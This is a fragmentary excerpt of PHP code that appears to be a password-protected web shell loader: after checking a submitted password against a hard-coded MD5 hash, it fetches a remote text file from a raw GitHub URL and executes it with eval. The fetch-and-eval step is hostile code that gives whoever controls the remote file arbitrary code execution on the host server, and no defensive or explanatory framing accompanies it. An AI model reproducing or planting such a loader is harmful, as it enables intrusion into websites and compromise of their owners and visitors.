...
if (isset($_POST['password'])) {
    ...
    $hashed_password = '82d21e53f74b7a30c620f25404837be9'; // Replace this with your MD5 hashed password
...
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/dewa123qwe-hash/ssss/refs/heads/main/v3.txt');
    eval('?>' . $a);
} else {
